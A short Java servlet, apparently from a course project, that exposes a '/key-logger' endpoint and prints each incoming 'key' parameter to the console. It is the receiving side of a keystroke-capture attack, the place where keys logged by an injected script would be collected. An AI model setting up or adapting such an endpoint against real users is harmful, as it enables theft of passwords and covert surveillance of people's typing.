package com.curso.controllers;

import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

@WebServlet("/key-logger")
public class KeyLogger extends HttpServlet {

	public void doGet(HttpServletRequest req, HttpServletResponse resp) {
		String key = req.getParameter("key");
		System.out.println("[!] Keys llegando: " + key);
	}
	
}
